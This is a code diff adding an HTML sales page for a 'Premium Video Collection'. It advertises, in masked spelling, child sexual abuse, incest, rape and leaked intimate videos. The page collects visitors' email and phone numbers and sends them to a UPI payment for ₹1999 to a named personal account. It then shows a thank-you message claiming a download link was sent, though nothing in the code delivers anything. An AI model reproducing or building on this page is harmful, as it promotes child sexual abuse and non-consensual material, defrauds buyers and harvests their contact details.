@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Premium Video Collection</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      color: #333;
+    }
+    
+    .collection-count {
+      background: #ff5722;
+      color: white;
+      padding: 8px;
+      border-radius: 20px;
+      font-size: 14px;
+      margin: 10px 0;
+      display: inline-block;
+    }
+
+    ul {
+      text-align: left;
+      margin: 20px 0;
+      padding-left: 20px;
+    }
+
+    input[type="email"], input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 5px 0;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    #paymentOptions, #confirmButton {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .pay-option {
+      margin: 10px 0;
+      padding: 12px;
+      background-color: #2196F3;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .thankyou {
+      display: none;
+      background: #e8f5e9;
+      padding: 20px;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+    
+    .highlight {
+      font-weight: bold;
+      color: #ff5722;
+    }
+    
+    .price-comparison {
+      margin: 15px 0;
+      font-size: 14px;
+    }
+    
+    .original-price {
+      text-decoration: line-through;
+      color: #888;
+    }
+    
+    .discount-badge {
+      background: #f44336;
+      color: white;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      margin-left: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎥 Premium Video Collection</h1>
+    <div class="collection-count">1,00,000+ Exclusive Videos</div>
+    
+    <ul>
+      <li>1.🎬 <span class="highlight">CH****d Videos</span>(Exclusive Content) </li>
+      <li>2.🎬 <span class="highlight">Bro*** & Sis*T*r videos</span>(Exclusive Content) </li>
+      <li>3.🎬 <span class="highlight">M0m & S@n Videos</span>(Exclusive Content) </li>
+      <li>4.🎬 <span class="highlight">JEEja & Sali Videos</span>(Exclusive Content) </li>
+      <li>5.🎬 <span class="highlight">R@pe De**si videos</span> (Exclusive Content)</li>
+<li>6.🎬 <span class="highlight">InstGram Viral Videos</span> (Exclusive Content)</li>
+<li>7.🎬 <span class="highlight">R@pe & F0Rced De**si Videos</span> (Exclusive Content)</li>
+<li>8.🎬 <span class="highlight">Le@ked H0t G*r*l MM$$ Videos</span> (Exclusive Content)</li>
+<li>9.🎬 <span class="highlight">Ch000T F@ad DE**si Videos</span> (Exclusive Content)</li>
+<li>10.🎬 <span class="highlight">Hard F**king Videos</span> (Exclusive Content)</li>
+    </ul>
+
+    <input type="email" id="email" placeholder="Enter your email" required />
+    <input type="tel" id="phone" placeholder="Enter your phone number" required />
+
+    <div class="price-comparison">
+      <span class="original-price">Original Price: ₹4999</span>
+      <span class="discount-badge">60% OFF</span>
+    </div>
+    
+    <button onclick="showPaymentOptions()">Buy Now - Only ₹1999</button>
+    <small>Limited Time Offer - Save ₹3000</small>
+
+    <div id="paymentOptions">
+      <h3>Select Payment Method</h3>
+      <button class="pay-option" onclick="pay('PhonePe')">📱 PhonePe</button>
+      <button class="pay-option" onclick="pay('GooglePay')">💳 Google Pay</button>
+      <button class="pay-option" onclick="pay('Paytm')">🏦 Paytm</button>
+    </div>
+
+    <div id="confirmButton">
+      <p><strong>After completing payment</strong>, click below:</p>
+      <button onclick="showThankYou()">✅ I have completed payment</button>
+    </div>
+
+    <div id="thankyouMessage" class="thankyou">
+      <h3>✅ Thank you for your purchase!</h3>
+      <p>Your premium video collection download link has been sent to your email and WhatsApp.</p>
+    </div>
+  </div>
+
+  <script>
+    function showPaymentOptions() {
+      const email = document.getElementById('email').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+
+      if (!email || !phone) {
+        alert("Please enter both email and phone number.");
+        return;
+      }
+
+      document.getElementById("paymentOptions").style.display = "block";
+      window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function pay(appName) {
+      const upiID = "rs9161rajesh@oksbi";
+      const name = "Rajesh Kumar";
+      const amount = "1999"; // Updated to new selling price
+      const note = "Premium Video Collection";
+
+      const upiLink = `upi://pay?pa=${upiID}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tn=${encodeURIComponent(note)}`;
+      
+      // Open UPI App
+      window.location.href = upiLink;
+
+      // Show confirm button after UPI opened
+      setTimeout(() => {
+        document.getElementById("confirmButton").style.display = "block";
+        window.scrollTo(0, document.body.scrollHeight);
+      }, 2000);
+    }
+
+    function showThankYou() {
+      document.getElementById("thankyouMessage").style.display = "block";
+      document.getElementById("paymentOptions").style.display = "none";
+      document.getElementById("confirmButton").style.display = "none";
+      window.scrollTo(0, document.body.scrollHeight);
+    }
+  </script>
+</body>
+</html>
